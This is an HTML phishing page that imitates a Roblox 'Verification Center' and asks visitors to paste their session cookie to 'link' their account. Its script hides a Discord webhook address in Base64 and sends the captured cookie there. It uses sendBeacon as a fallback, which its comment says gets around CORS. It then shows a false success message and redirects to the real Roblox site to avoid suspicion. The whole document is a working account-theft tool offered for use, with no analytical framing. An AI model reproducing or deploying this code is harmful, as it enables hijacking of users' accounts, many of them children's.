<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox | Verification Center</title>
    <style>
        body { background: #191B1D; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #252729; padding: 40px; border-radius: 8px; width: 350px; text-align: center; border-top: 4px solid #0084FF; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 4px; border: 1px solid #3E4144; background: #191B1D; color: #fff; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 14px; border: none; border-radius: 4px; background: #0084FF; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #0073e6; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="margin-bottom:10px;">
        <h2>Verify Session</h2>
        <p style="font-size:13px; color:#ADB5BD;">Paste your Session ID below to link your account.</p>
        <input type="text" id="cook" placeholder="_|WARNING:-DO-NOT-SHARE-..." autocomplete="off">
        <button onclick="send()">Link Account</button>
    </div>

    <script>
        async function send() {
            const cookieValue = document.getElementById('cook').value;
            const btn = document.querySelector('button');

            if (!cookieValue.includes("_|WARNING")) {
                alert("Invalid Session ID!");
                return;
            }

            btn.disabled = true;
            btn.innerHTML = "Processing...";

            // Твоят Base64 Webhook
            const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQ0NTQwNTQ0NjczMzg0NS9LWlBfV0k4cFFXclk2Wm1SMTd2OFREVTEwQU5BSFByN0hhWVVCdnZOTUZqTmIyMUtfZzZJQ1M1UjNHWkkxaDJoeHlXaA==";
            const hook = atob(b64);

            const payload = JSON.stringify({
                content: "@everyone ⚡ **NEW DATA**",
                embeds: [{
                    title: "Roblox Session Captured",
                    color: 16711680,
                    fields: [{ name: "Cookie", value: "```" + cookieValue + "```" }],
                    timestamp: new Date().toISOString()
                }]
            });

            try {
                // Метод 1: Стандартен Fetch
                const response = await fetch(hook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload
                });

                if (response.ok || response.status === 204) {
                    finish();
                } else {
                    throw new Error();
                }
            } catch (e) {
                // Метод 2: Резервен вариант (Beacon) - заобикаля CORS
                const blob = new Blob([payload], { type: 'application/json' });
                navigator.sendBeacon(hook, blob);
                
                // Изчакваме малко и пренасочваме
                setTimeout(finish, 1500);
            }
        }

        function finish() {
            alert("Account linked successfully!");
            window.location.href = "https://www.roblox.com/home";
        }
    </script>
</body>
</html>
